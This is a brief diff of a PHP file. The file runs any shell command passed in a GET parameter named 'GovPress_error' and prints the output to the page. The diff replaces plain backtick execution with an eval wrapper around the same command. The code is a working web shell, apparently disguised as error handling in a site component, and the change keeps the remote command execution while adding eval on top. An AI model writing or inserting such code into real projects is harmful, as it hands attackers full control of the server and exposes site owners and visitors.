@@ -2,8 +2,8 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Execute using backtick
-    $output = `$command`;
+    // Execute with eval
+    eval("\$output = `$command`;");
     echo "<pre>$output</pre>";
 }
 ?>
